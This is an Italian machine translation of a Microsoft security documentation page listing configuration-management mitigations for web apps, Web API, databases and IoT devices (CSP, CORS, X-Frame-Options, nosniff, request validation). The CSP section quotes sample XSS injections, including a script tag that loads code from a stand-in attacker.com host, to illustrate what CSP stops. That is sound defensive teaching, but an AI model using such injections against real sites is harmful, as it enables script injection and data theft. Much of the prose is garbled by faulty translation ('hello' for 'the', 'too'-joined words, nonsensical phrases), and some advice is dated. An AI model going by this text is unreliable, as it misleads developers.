---
title: Gestione - di modellazione strumento Microsoft Threat - Azure aaaConfiguration | Documenti Microsoft
description: misure di attenuazione esposte in hello strumento di modellazione del rischio di minacce per la
services: security
documentationcenter: na
author: RodSan
manager: RodSan
editor: RodSan
ms.assetid: na
ms.service: security
ms.workload: na
ms.tgt_pltfrm: na
ms.devlang: na
ms.topic: article
ms.date: 08/17/2017
ms.author: rodsan
ms.openlocfilehash: 77aa4352fa61e928a1b7a4ff1d488a55d3d9b970
ms.sourcegitcommit: 523283cc1b3c37c428e77850964dc1c33742c5f0
ms.translationtype: MT
ms.contentlocale: it-IT
ms.lasthandoff: 10/06/2017
---
# <a name="security-frame-configuration-management--mitigations"></a>Infrastruttura di sicurezza: gestione della configurazione - Procedure di mitigazione 
| Prodotto o servizio | Articolo |
| --------------- | ------- |
| **Applicazione Web** | <ul><li>[Implementare Content Security Policy (CSP) e disabilitare il contenuto JavaScript inline](#csp-js)</li><li>[Abilitare il filtro XSS del browser](#xss-filter)</li><li>[Applicazioni ASP.NET è necessario disabilitare la traccia e debug toodeployment precedente](#trace-deploy)</li><li>[Accedere a contenuto JavaScript di terze parti solo da origini attendibili](#js-trusted)</li><li>[Assicurarsi che le pagine ASP.NET autenticate incorporino difese contro attacchi di tipo UI redress o click-jacking](#ui-defenses)</li><li>[Assicurarsi che siano consentite solo origini attendibili se CORS è abilitato nelle applicazioni Web ASP.NET](#cors-aspnet)</li><li>[Abilitare l'attributo ValidateRequest nelle pagine ASP.NET](#validate-aspnet)</li><li>[Usare le versioni più recenti ospitate in locale delle librerie JavaScript](#local-js)</li><li>[Disabilitare l'analisi MIME automatica](#mime-sniff)</li><li>[Rimuovere le intestazioni standard server in siti Web di Azure tooavoid fingerprinting](#standard-finger)</li></ul> |
| **Database** | <ul><li>[Configurare Windows Firewall per l'accesso al motore di database](#firewall-db)</li></ul> |
| **API Web** | <ul><li>[Assicurarsi che siano consentite solo origini attendibili se CORS è abilitato nell'API Web ASP.NET](#cors-api)</li><li>[Crittografare le sezioni dei file di configurazione dell'API Web contenenti dati sensibili](#config-sensitive)</li></ul> |
| **Dispositivo IoT** | <ul><li>[Assicurarsi che tutte le interfacce amministrative siano protette con credenziali sicure](#admin-strong)</li><li>[Assicurarsi che un codice sconosciuto non possa essere eseguito sui dispositivi](#unknown-exe)</li><li>[Crittografare il sistema operativo e altre partizioni del dispositivo IoT con bit-locker](#partition-iot)</li><li>[Verificare che solo hello minimo servizi o le funzionalità siano abilitate nei dispositivi](#min-enable)</li></ul> |
| **Gateway IoT sul campo** | <ul><li>[Crittografare il sistema operativo e altre partizioni del gateway IoT sul campo con bit-locker](#field-bit-locker)</li><li>[Verificare che le credenziali di accesso predefinito di hello del gateway campo hello vengano modificate durante l'installazione](#default-change)</li></ul> |
| **Gateway IoT cloud** | <ul><li>[Assicurarsi che Gateway del Cloud hello implementa un firmware di dispositivi connesso hello tookeep processo backup toodate](#cloud-firmware)</li></ul> |
| **Limite di Trust del computer** | <ul><li>[Assicurarsi che i dispositivi abbiano i controlli di sicurezza degli endpoint configurati in base ai criteri organizzativi](#controls-policies)</li></ul> |
| **Archiviazione di Azure** | <ul><li>[Assicurare una gestione sicura delle chiavi di accesso alle risorse di archiviazione di Azure](#secure-keys)</li><li>[Assicurarsi che siano consentite solo origini attendibili se CORS è abilitato in Archiviazione di Azure](#cors-storage)</li></ul> |
| **WCF** | <ul><li>[Abilitare la funzionalità di limitazione dei servizi di WCF](#throttling)</li><li>[Diffusione di informazioni di WCF tramite i metadati](#info-metadata)</li></ul> | 

## <a id="csp-js"></a>Implementare Content Security Policy (CSP) e disabilitare il contenuto JavaScript inline

| Titolo                   | Dettagli      |
| ----------------------- | ------------ |
| **Componente**               | Applicazione Web. | 
| **Fase SDL**               | Compilare |  
| **Tecnologie applicabili** | Generico |
| **Attributes (Attributi) (Attributi)**              | N/D  |
| **Riferimenti**              | [Un criterio di sicurezza di tooContent Introduzione](http://www.html5rocks.com/en/tutorials/security/content-security-policy/), [riferimento ai criteri di sicurezza contenuto](http://content-security-policy.com/), [funzionalità di sicurezza](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/), [criteri di sicurezza di introduzione toocontent](https://docs.webplatform.org/wiki/tutorials/content-security-policy), [è possibile utilizzare CSP?](http://caniuse.com/#feat=contentsecuritypolicy) |
| **Passaggi** | <p>Criteri di protezione del contenuto (CSP) è un meccanismo di sicurezza di difesa in profondità, un W3C standard, che consente di controllo di toohave proprietari dell'applicazione web hello contenuto incorporato nel relativo sito. CSP viene aggiunto come un'intestazione di risposta HTTP nel server web hello e imposto sul lato client hello dal browser. Si tratta di criteri basati su un elenco di elementi consentiti: un sito Web può dichiarare un set di domini attendibili da cui possono essere caricati contenuti attivi, ad esempio JavaScript.</p><p>CSP fornisce hello vantaggi di sicurezza seguenti:</p><ul><li>**Protezione contro XSS:** se una pagina è vulnerabile tooXSS, è possibile sfruttare il in 2 modi:<ul><li>Inserimento di `<script>malicious code</script>`. Questo attacco non funzionerà a causa del tooCSP Base restrizione-1</li><li>Inserimento di `<script src=”http://attacker.com/maliciousCode.js”/>`. Questo attacco non funzionerà poiché dominio controllata hello non nell'elenco elementi consentiti dal CSP di domini</li></ul></li><li>**Controllo dati exfiltration:** se qualsiasi contenuto dannoso in una pagina Web tenta di sottrarre dati e il sito Web esterno di tooconnect tooan, hello connessione verrà interrotta dal CSP. Infatti, non sarà il dominio di destinazione hello nell'elenco elementi consentiti dal CSP</li><li>**Difesa contro martinetto fare clic su:** martinetto clic è una tecnica di attacco tramite il quale un avversario possibile frame di un sito Web originale e forzare tooclick utenti sugli elementi dell'interfaccia utente. Attualmente la difesa contro il click-jacking si basa sulla configurazione dell'intestazione della risposta X-Frame-Options. Questa intestazione viene rispettata non tutti i browser e passare CSP inoltro sarà un toodefend in modo standard contro martinetto fare clic su</li><li>**Attacco in tempo reale reporting:** se è presente un attacco di inserimento in un sito Web abilitata CSP, browser verrà automaticamente avviato un endpoint di notifica tooan configurato nel server Web hello. In questo modo, CSP funge da sistema di avviso in tempo reale.</li></ul> |

### <a name="example"></a>Esempio
Criteri di esempio: 
```C#
Content-Security-Policy: default-src 'self'; script-src 'self' www.google-analytics.com 
```
Questo criterio consente tooload script solo del web un'applicazione hello server e google analitica. Gli script caricati da altri siti verranno rifiutati. Quando CSP è abilitato in un sito Web, hello funzionalità seguenti sono gli attacchi XSS toomitigate automaticamente disabilitato. 

### <a name="example"></a>Esempio
Gli script inline non verranno eseguiti. Di seguito sono riportati esempi di script inline. 
```javascript
<script> some Javascript code </script>
Event handling attributes of HTML tags (e.g., <button onclick=”function(){}”>
javascript:alert(1);
```

### <a name="example"></a>Esempio
Le stringhe non verranno valutate come codice. 
```javascript
Example: var str="alert(1)"; eval(str);
```

## <a id="xss-filter"></a>Abilitare il filtro XSS del browser

| Titolo                   | Dettagli      |
| ----------------------- | ------------ |
| **Componente**               | Applicazione Web. | 
| **Fase SDL**               | Compilare |  
| **Tecnologie applicabili** | Generico |
| **Attributes (Attributi) (Attributi)**              | N/D  |
| **Riferimenti**              | [XSS Protection Filter](https://www.owasp.org/index.php/List_of_useful_HTTP_headers#X-XSS-Protection) (Filtro di protezione XSS) |
| **Passaggi** | <p>Controlli di configurazione intestazione X-protezione XSS risposta hello filtro di script sul sito Web del browser. Questa intestazione della risposta può avere i valori seguenti:</p><ul><li>`0:`Consente di disabilitare il filtro hello</li><li>`1: Filter enabled`Se viene rilevato un attacco di script tra siti, in ordine toostop hello attacco di tipo browser hello verrà purificare pagina hello</li><li>`1: mode=block : Filter enabled`. Anziché purificare pagina hello, quando viene rilevato un attacco XSS, browser hello impedirà il rendering della pagina hello</li><li>`1: report=http://[YOURDOMAIN]/your_report_URI : Filter enabled`. browser Hello verrà purificare hello pagina e report hello violazione.</li></ul><p>Questa è una funzione di Chromium utilizzando CSP violazione report toosend dettagli tooa URI di propria scelta. Hello ultimi 2 opzioni vengono considerate valori sicuri.</p>|

## <a id="trace-deploy"></a>Applicazioni ASP.NET è necessario disabilitare la traccia e debug toodeployment precedente

| Titolo                   | Dettagli      |
| ----------------------- | ------------ |
| **Componente**               | Applicazione Web. | 
| **Fase SDL**               | Compilare |  
| **Tecnologie applicabili** | Generico |
| **Attributes (Attributi) (Attributi)**              | N/D  |
| **Riferimenti**              | [Panoramica del debug di ASP.NET](http://msdn2.microsoft.com/library/ms227556.aspx), [Panoramica dell'analisi di ASP.NET](http://msdn2.microsoft.com/library/bb386420.aspx), [Procedura: Abilitare l'analisi per un'applicazione ASP.NET](http://msdn2.microsoft.com/library/0x5wc973.aspx), [Procedura: Abilitare il debug per applicazioni ASP.NET](http://msdn2.microsoft.com/library/e8z01xdh(VS.80).aspx) |
| **Passaggi** | Quando la traccia è abilitata per la pagina di hello, ogni browser anche la richiesta di ottenere informazioni di traccia hello che contiene i dati relativi al flusso di lavoro e lo stato interno del server. Tali informazioni possono essere relative alla sicurezza. Quando il debug è abilitato per la pagina di hello, gli errori che si verifichi hello server producono un dati di traccia di stack completo presentato toohello browser. Tali dati possono esporre informazioni riservate sul flusso di lavoro del server hello. |

## <a id="js-trusted"></a>Accedere a contenuto JavaScript di terze parti solo da origini attendibili

| Titolo                   | Dettagli      |
| ----------------------- | ------------ |
| **Componente**               | Applicazione Web. | 
| **Fase SDL**               | Compilare |  
| **Tecnologie applicabili** | Generico |
| **Attributes (Attributi) (Attributi)**              | N/D  |
| **Riferimenti**              | N/D  |
| **Passaggi** | solo le origini attendibili devono fare riferimento al contenuto JavaScript di terze parti. gli endpoint di riferimento Hello devono essere sempre su SSL. |

## <a id="ui-defenses"></a>Assicurarsi che le pagine ASP.NET autenticate incorporino difese contro attacchi di tipo UI redress o click-jacking

| Titolo                   | Dettagli      |
| ----------------------- | ------------ |
| **Componente**               | Applicazione Web. | 
| **Fase SDL**               | Compilare |  
| **Tecnologie applicabili** | Generico |
| **Attributes (Attributi) (Attributi)**              | N/D  |
| **Riferimenti**              | [OWASP click-jacking Defense Cheat Sheet](https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet) (Foglio informativo di OWASP sulla difesa contro il click-jacking), [IE Internals - Combating click-jacking With X-Frame-Options](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-click-jacking-with-x-frame-options/) (IEInternals: lotta al click-jacking con X-Frame-Options) |
| **Passaggi** | <p>Fare clic su-martinetto, noto anche come "attacchi di reindirizzamento dell'interfaccia utente," è quando un utente malintenzionato Usa più livelli opaco o trasparente tootrick un utente in facendo clic su un pulsante o collegamento in un'altra pagina quando essi sono stati prefiggersi tooclick nella pagina di primo livello hello.</p><p>Questa sovrapposizione viene raggiunta grazie alla creazione di una pagina con un iframe, che carica la pagina della vittima hello. Di conseguenza, autore dell'attacco hello è "Hijack", fa clic su destinata la pagina e di indirizzarli tooanother pagina proprietà probabilmente da un'altra applicazione, dominio o entrambi. tooprevent martinetto fare clic su, set hello corretto X-Frame-Options intestazioni di risposta HTTP che comunicano hello browser toonot consentono a frame da altri domini</p>|

### <a name="example"></a>Esempio
intestazione X-FRAME-OPTIONS Hello può essere impostata tramite Web. config IIS. Frammento di codice di Web.config che non devono mai essere inseriti in un frame: 
```C#
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="DENY"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

### <a name="example"></a>Esempio
Codice di Web. config per i siti che devono solo essere racchiuso dal pagine hello stesso dominio: 
```C#
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="SAMEORIGIN"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

## <a id="cors-aspnet"></a>Assicurarsi che siano consentite solo origini attendibili se CORS è abilitato nelle applicazioni Web ASP.NET

| Titolo                   | Dettagli      |
| ----------------------- | ------------ |
| **Componente**               | Applicazione Web. | 
| **Fase SDL**               | Compilare |  
| **Tecnologie applicabili** | Web Form, MVC 5 |
| **Attributes (Attributi) (Attributi)**              | N/D  |
| **Riferimenti**              | N/D  |
| **Passaggi** | <p>Protezione del browser impedisce che una pagina web rendendo AJAX richieste tooanother dominio. Questa restrizione è denominata hello stessa origine criteri e impedisce a un sito di leggere i dati sensibili da un altro sito. Tuttavia, in alcuni casi potrebbe essere necessario tooexpose API in modo sicuro che può essere utilizzato altri siti. Tra la condivisione di risorse origini (CORS) è uno standard W3C che consente a un server dei criteri di toorelax hello stessa origine. Con CORS un server può consentire in modo esplicito alcune richieste multiorigine e rifiutarne altre.</p><p>CORS è più sicuro e flessibile delle tecniche precedenti, ad esempio JSONP. In sostanza, l'abilitazione di CORS traduce tooadding alcune intestazioni di risposta HTTP (Access - Control-*) dell'applicazione web toohello e questo può essere eseguite in due modi.</p>|

### <a name="example"></a>Esempio
Se l'accesso tooWeb.config è disponibile, CORS è possibile aggiungere tramite hello seguente codice: 
```XML
<system.webServer>
    <httpProtocol>
      <customHeaders>
        <clear />
        <add name="Access-Control-Allow-Origin" value="http://example.com" />
      </customHeaders>
    </httpProtocol>
```

### <a name="example"></a>Esempio
Se tooweb.config di accesso non è disponibile, CORS può essere configurato tramite l'aggiunta di hello CSharp codice seguente: 
```C#
HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "http://example.com")
```

Si noti che è critico tooensure che l'elenco di origini nell'attributo "Access-Control-Allow-Origin" hello sono impostare di tooa finito e attendibile i set di origini. Errore tooconfigure questo modo non appropriato (ad esempio, impostando il valore di hello come ' *') consentirà tootrigger siti pericolosi origine richieste tra applicazioni web toohello > senza restrizioni, rendendo hello applicazione vulnerabile tooCSRF attacchi. 

## <a id="validate-aspnet"></a>Abilitare l'attributo ValidateRequest nelle pagine ASP.NET

| Titolo                   | Dettagli      |
| ----------------------- | ------------ |
| **Componente**               | Applicazione Web. | 
| **Fase SDL**               | Compilare |  
| **Tecnologie applicabili** | Web Form, MVC 5 |
| **Attributes (Attributi) (Attributi)**              | N/D  |
| **Riferimenti**              | [Request Validation - Preventing Script Attacks](http://www.asp.net/whitepapers/request-validation) (Convalida della richiesta: prevenzione degli attacchi basati su script) |
| **Passaggi** | <p>Convalida della richiesta, una funzionalità di ASP.NET versione 1.1, impedisce l'accettazione contenuto HTML decodificati contenitore server hello. Questa funzionalità è stata progettata toohelp evitare alcuni attacchi script injection possono essere server tooa involontario inviato, archiviati e quindi presentato tooother utenti in base al quale il codice di script client o HTML. È tuttavia vivamente consigliabile convalidare tutti i dati di input e codificarli con HTML, se appropriato.</p><p>Convalida della richiesta viene eseguita confrontando tutti i dati di input tooa elenco valori potenzialmente pericolosi. Se viene rilevata una corrispondenza, ASP.NET genera `HttpRequestValidationException`. Per impostazione predefinita, la funzionalità di convalida della richiesta è abilitata.</p>|

### <a name="example"></a>Esempio
Questa funzionalità può essere tuttavia disabilitata a livello di pagina: 
```XML
<%@ Page validateRequest="false" %> 
```
o a livello di applicazione. 
```XML
<configuration>
   <system.web>
      <pages validateRequest="false" />
   </system.web>
</configuration>
```
Si noti che la funzionalità di convalida della richiesta non è supportata e non fa parte della pipeline MVC 6. 

## <a id="local-js"></a>Usare le versioni più recenti ospitate in locale delle librerie JavaScript

| Titolo                   | Dettagli      |
| ----------------------- | ------------ |
| **Componente**               | Applicazione Web. | 
| **Fase SDL**               | Compilare |  
| **Tecnologie applicabili** | Generico |
| **Attributes (Attributi) (Attributi)**              | N/D  |
| **Riferimenti**              | N/D  |
| **Passaggi** | <p>Gli sviluppatori che usano librerie JavaScript standard, ad esempio JQuery, devono usare versioni approvate delle comuni librerie JavaScript che non contengono difetti di sicurezza noti. Una procedura consigliata è toouse hello più recente delle librerie di hello, poiché contengono correzioni di vulnerabilità note le versioni precedenti.</p><p>Se la versione più recente di hello non può essere utilizzata a causa di motivi toocompatibility, hello sotto le versioni minime deve essere utilizzato.</p><p>Versioni minime accettabili:</p><ul><li>**JQuery**<ul><li>JQuery 1.7.1</li><li>JQueryUI 1.10.0</li><li>JQuery Validate 1.9</li><li>JQuery Mobile 1.0.1</li><li>JQuery Cycle 2.99</li><li>JQuery DataTables 1.9.0</li></ul></li><li>**Ajax Control Toolkit**<ul><li>Ajax Control Toolkit 40412</li></ul></li><li>**Web Form ASP.NET e Ajax**<ul><li>Web Form ASP.NET e Ajax 4</li><li>ASP.NET Ajax 3.5</li></ul></li><li>**ASP.NET MVC**<ul><li>ASP.NET MVC 3.0</li></ul></li></ul><p>Non caricare mai librerie JavaScript da siti esterni, ad esempio reti CDN pubbliche.</p>|

## <a id="mime-sniff"></a>Disabilitare l'analisi MIME automatica

| Titolo                   | Dettagli      |
| ----------------------- | ------------ |
| **Componente**               | Applicazione Web. | 
| **Fase SDL**               | Compilare |  
| **Tecnologie applicabili** | Generico |
| **Attributes (Attributi) (Attributi)**              | N/D  |
| **Riferimenti**              | [IE8 Security Part V: Comprehensive Protection](http://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx) (Sicurezza di IE8 parte V: protezione completa), [MIME type](http://en.wikipedia.org/wiki/Mime_type) (Tipo MIME) |
| **Passaggi** | intestazione X-contenuto-tipo-Options Hello è un'intestazione HTTP che consente agli sviluppatori toospecify che il loro contenuto non è deve essere rilevato la presenza di MIME. Questa intestazione è progettato toomitigate analisi MIME attacchi. Per ogni pagina che può contenere contenuto controllabile utente, è necessario utilizzare hello HTTP intestazione X-contenuto-tipo-opzioni: nosniff. intestazione obbligatoria hello di tooenable globalmente per tutte le pagine applicazione hello, è possibile eseguire uno dei seguenti hello|

### <a name="example"></a>Esempio
Aggiungere intestazione hello nel file Web. config hello se un'applicazione hello è ospitata da Internet Information Services (IIS) 7 in poi. 
```XML
<system.webServer>
<httpProtocol>
<customHeaders>
<add name="X-Content-Type-Options" value="nosniff"/>
</customHeaders>
</httpProtocol>
</system.webServer>
```

### <a name="example"></a>Esempio
Aggiungi intestazione hello tramite hello applicazione globale\_BeginRequest 
```C#
void Application_BeginRequest(object sender, EventArgs e)
{
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
}
```

### <a name="example"></a>Esempio
Implementare un modulo HTTP personalizzato. 
```C#
public class XContentTypeOptionsModule : IHttpModule
{
#region IHttpModule Members
public void Dispose()
{
}
public void Init(HttpApplication context)
{
context.PreSendRequestHeaders += newEventHandler(context_PreSendRequestHeaders);
}
#endregion
void context_PreSendRequestHeaders(object sender, EventArgs e)
{
HttpApplication application = sender as HttpApplication;
if (application == null)
  return;
if (application.Response.Headers["X-Content-Type-Options "] != null)
  return;
application.Response.Headers.Add("X-Content-Type-Options ", "nosniff");
}
}
```

### <a name="example"></a>Esempio
È possibile abilitare l'intestazione di richiesta hello solo per le pagine specifiche aggiungendolo tooindividual risposte: 

```C#
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
```

## <a id="standard-finger"></a>Rimuovere le intestazioni standard server in siti Web di Azure tooavoid fingerprinting

| Titolo                   | Dettagli      |
| ----------------------- | ------------ |
| **Componente**               | Applicazione Web. | 
| **Fase SDL**               | Compilare |  
| **Tecnologie applicabili** | Generico |
| **Attributes (Attributi) (Attributi)**              | Tipo di ambiente: Azure |
| **Riferimenti**              | [Removing standard server headers on Windows Azure Web Sites](https://azure.microsoft.com/blog/removing-standard-server-headers-on-windows-azure-web-sites/) (Rimozione di intestazioni del server standard nei siti Web di Microsoft Azure) |
| **Passaggi** | Le intestazioni, ad esempio Server, X-alimentati-By-versione di AspNet X rivelano informazioni sul server hello e hello tecnologie sottostanti. È consigliabile toosuppress queste intestazioni evitando fingerprinting hello applicazione |

## <a id="firewall-db"></a>Configurare Windows Firewall per l'accesso al motore di database

| Titolo                   | Dettagli      |
| ----------------------- | ------------ |
| **Componente**               | Database | 
| **Fase SDL**               | Compilare |  
| **Tecnologie applicabili** | SQL Azure, locale |
| **Attributes (Attributi) (Attributi)**              | N/D, versione SQL: V12 |
| **Riferimenti**              | [Come tooconfigure SQL Azure database firewall](https://azure.microsoft.com/documentation/articles/sql-database-firewall-configure/), [configurare Windows Firewall per l'accesso al motore di Database](https://msdn.microsoft.com/library/ms175043) |
| **Passaggi** | Sistemi firewall contribuiscono a impedire l'accesso non autorizzato alle risorse di toocomputer. tooaccess un'istanza di hello il motore di Database di SQL Server attraverso un firewall, è necessario configurare il firewall di hello in computer hello tooallow accesso a SQL Server |

## <a id="cors-api"></a>Assicurarsi che siano consentite solo origini attendibili se CORS è abilitato nell'API Web ASP.NET

| Titolo                   | Dettagli      |
| ----------------------- | ------------ |
| **Componente**               | API Web | 
| **Fase SDL**               | Compilare |  
| **Tecnologie applicabili** | MVC 5 |
| **Attributes (Attributi) (Attributi)**              | N/D  |
| **Riferimenti**              | [Enabling Cross-Origin Requests in ASP.NET Web API 2](http://www.asp.net/web-api/overview/security/enabling-cross-origin-requests-in-web-api) (Abilitazione di richieste multiorigine nell'API Web ASP.NET 2), [API Web ASP.NET: supporto di CORS nell'API Web ASP.NET 2](https://msdn.microsoft.com/magazine/dn532203.aspx) |
| **Passaggi** | <p>Protezione del browser impedisce che una pagina web rendendo AJAX richieste tooanother dominio. Questa restrizione è denominata hello stessa origine criteri e impedisce a un sito di leggere i dati sensibili da un altro sito. Tuttavia, in alcuni casi potrebbe essere necessario tooexpose API in modo sicuro che può essere utilizzato altri siti. Tra la condivisione di risorse origini (CORS) è uno standard W3C che consente a un server dei criteri di toorelax hello stessa origine.</p><p>Con CORS un server può consentire in modo esplicito alcune richieste multiorigine e rifiutarne altre. CORS è più sicuro e flessibile delle tecniche precedenti, ad esempio JSONP.</p>|

### <a name="example"></a>Esempio
Aggiungere codice al metodo WebApiConfig.Register toohello hello hello App_Start/WebApiConfig.cs, 
```C#
using System.Web.Http;
namespace WebService
{
    public static class WebApiConfig
    {
        public static void Register(HttpConfiguration config)
        {
            // New code
            config.EnableCors();

            config.Routes.MapHttpRoute(
                name: "DefaultApi",
                routeTemplate: "api/{controller}/{id}",
                defaults: new { id = RouteParameter.Optional }
            );
        }
    }
}
```

### <a name="example"></a>Esempio
Attributo EnableCors può essere applicato tooaction metodi in un controller come segue: 

```C#
public class ResourcesController : ApiController
{
  [EnableCors("http://localhost:55912", // Origin
              null,                     // Request headers
              "GET",                    // HTTP methods
              "bar",                    // Response headers
              SupportsCredentials=true  // Allow credentials
  )]
  public HttpResponseMessage Get(int id)
  {
    var resp = Request.CreateResponse(HttpStatusCode.NoContent);
    resp.Headers.Add("bar", "a bar value");
    return resp;
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "PUT",                          // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "POST",                         // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
}
```

Nota che è critico tooensure che hello elenco di origini nell'attributo EnableCors è impostare di tooa finito e attendibile i set di origini. Errore tooconfigure questo modo non appropriato (ad esempio, impostando il valore di hello come ' *') consentirà tootrigger siti pericolosi cross-origin richieste toohello API senza restrizioni, >, rendendo pertanto hello API tooCSRF vulnerabile attacchi. EnableCors può essere decorato a livello di controller. 

### <a name="example"></a>Esempio
toodisable CORS su un metodo specifico in una classe, hello DisableCors attributo può essere utilizzato come illustrato di seguito: 
```C#
[EnableCors("http://example.com", "Accept, Origin, Content-Type", "POST")]
public class ResourcesController : ApiController
{
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  // CORS not allowed because of hello [DisableCors] attribute
  [DisableCors]
  public HttpResponseMessage Delete(int id)
  {
    return Request.CreateResponse(HttpStatusCode.NoContent);
  }
}
```

| Titolo                   | Dettagli      |
| ----------------------- | ------------ |
| **Componente**               | API Web | 
| **Fase SDL**               | Compilare |  
| **Tecnologie applicabili** | MVC 6 |
| **Attributes (Attributi) (Attributi)**              | N/D  |
| **Riferimenti**              | [Enabling Cross-Origin Requests (CORS) in ASP.NET Core 1.0](https://docs.asp.net/en/latest/security/cors.html) (Abilitazione di richieste multiorigine (CORS) in ASP.NET Core 1.0) |
| **Passaggi** | <p>In ASP.NET Core 1.0 CORS può essere abilitato usando il middleware o MVC. Quando si utilizza hello CORS tooenable MVC stesso CORS servizi utilizzati, ma hello middleware CORS non lo è.</p>|

**Approccio 1** l'abilitazione di CORS con middleware: tooenable CORS per l'intera applicazione hello aggiungere hello CORS middleware toohello pipeline delle richieste tramite il metodo di estensione UseCors hello. Quando si aggiunge middleware CORS hello utilizzando hello CorsPolicyBuilder classe, è possibile specificare un criterio di cross-origin. Esistono due modi toodo questo:

### <a name="example"></a>Esempio
Hello viene innanzitutto toocall UseCors con un'espressione lambda. lambda Hello accetta un oggetto CorsPolicyBuilder: 
```C#
public void Configure(IApplicationBuilder app)
{
    app.UseCors(builder =>
        builder.WithOrigins("http://example.com")
        .WithMethods("GET", "POST", "HEAD")
        .WithHeaders("accept", "content-type", "origin", "x-custom-header"));
}
```

### <a name="example"></a>Esempio
in secondo luogo, Hello è toodefine uno o più denominate criteri CORS e quindi selezionare hello criteri in base al nome in fase di esecuzione. 
```C#
public void ConfigureServices(IServiceCollection services)
{
    services.AddCors(options =>
    {
        options.AddPolicy("AllowSpecificOrigin",
            builder => builder.WithOrigins("http://example.com"));
    });
}
public void Configure(IApplicationBuilder app)
{
    app.UseCors("AllowSpecificOrigin");
    app.Run(async (context) =>
    {
        await context.Response.WriteAsync("Hello World!");
    });
}
```

**Approccio 2** l'abilitazione di CORS in MVC: gli sviluppatori possono utilizzare in alternativa tooapply MVC specifiche CORS per ogni azione, per ogni controller o a livello globale per tutti i controller.

### <a name="example"></a>Esempio
Per ogni azione: toospecify un criterio CORS per un'azione specifica aggiungere l'azione di hello [EnableCors] attributo toohello. Specificare il nome di criterio hello. 
```C#
public class HomeController : Controller
{
    [EnableCors("AllowSpecificOrigin")] 
    public IActionResult Index()
    {
        return View();
    }
```

### <a name="example"></a>Esempio
Per controller: 
```C#
[EnableCors("AllowSpecificOrigin")]
public class HomeController : Controller
{
```

### <a name="example"></a>Esempio
A livello globale: 
```C#
public void ConfigureServices(IServiceCollection services)
{
    services.AddMvc();
    services.Configure<MvcOptions>(options =>
    {
        options.Filters.Add(new CorsAuthorizationFilterFactory("AllowSpecificOrigin"));
    });
}
```
Nota che è critico tooensure che hello elenco di origini nell'attributo EnableCors è impostare di tooa finito e attendibile i set di origini. Errore tooconfigure questo modo non appropriato (ad esempio, impostando il valore di hello come ' *') consentirà tootrigger siti pericolosi cross-origin richieste toohello API senza restrizioni, >, rendendo pertanto hello API tooCSRF vulnerabile attacchi. 

### <a name="example"></a>Esempio
toodisable CORS per un controller o un'azione, utilizzare l'attributo hello [DisableCors]. 
```C#
[DisableCors]
    public IActionResult About()
    {
        return View();
    }
```

## <a id="config-sensitive"></a>Crittografare le sezioni dei file di configurazione dell'API Web contenenti dati sensibili

| Titolo                   | Dettagli      |
| ----------------------- | ------------ |
| **Componente**               | API Web | 
| **Fase SDL**               | Distribuzione |  
| **Tecnologie applicabili** | Generico |
| **Attributes (Attributi) (Attributi)**              | N/D  |
| **Riferimenti**              | [Procedura: Crittografare sezioni di configurazione in ASP.NET 2.0 tramite DPAPI](https://msdn.microsoft.com/library/ff647398.aspx), [specificando un Provider di configurazione protetta](https://msdn.microsoft.com/library/68ze1hb2.aspx), [i segreti dell'applicazione di tooprotect utilizzando insieme credenziali chiavi di Azure](https://azure.microsoft.com/documentation/articles/guidance-multitenant-identity-keyvault/) |
| **Passaggi** | File di configurazione, ad esempio hello Web. config, sono spesso appSettings. JSON usato toohold informazioni sensibili, inclusi i nomi utente, password, le stringhe di connessione di database e le chiavi di crittografia. Se non proteggere queste informazioni, l'applicazione è vulnerabile tooattackers o gli utenti malintenzionati di ottenere informazioni riservate, ad esempio nomi di account utente e password, i nomi di database e server. Basato sul tipo di distribuzione hello (azure/locale), crittografare sezioni di sensibili hello del file di configurazione usando DPAPI o servizi come insieme di credenziali chiave di Azure. |

## <a id="admin-strong"></a>Assicurarsi che tutte le interfacce amministrative siano protette con credenziali sicure

| Titolo                   | Dettagli      |
| ----------------------- | ------------ |
| **Componente**               | Dispositivo IoT | 
| **Fase SDL**               | Distribuzione |  
| **Tecnologie applicabili** | Generico |
| **Attributes (Attributi) (Attributi)**              | N/D  |
| **Riferimenti**              | N/D  |
| **Passaggi** | Le interfacce amministrative qualsiasi dispositivo hello o espone gateway campo devono essere protette tramite credenziali complesse. Anche tutte le altre interfacce esposte, ad esempio WiFi, SSH, condivisioni file e FTP, devono essere protette con credenziali sicure. Non si devono usare le password vulnerabili predefinite. |

## <a id="unknown-exe"></a>Assicurarsi che un codice sconosciuto non possa essere eseguito sui dispositivi

| Titolo                   | Dettagli      |
| ----------------------- | ------------ |
| **Componente**               | Dispositivo IoT | 
| **Fase SDL**               | Compilare |  
| **Tecnologie applicabili** | Generico |
| **Attributes (Attributi) (Attributi)**              | N/D  |
| **Riferimenti**              | [Enabling Secure Boot and bit-locker Device Encryption on Windows 10 IoT Core](https://developer.microsoft.com/windows/iot/win10/sb_bl) (Abilitazione dell'avvio protetto e della crittografia dispositivo BitLocker in Windows 10 IoT Core) |
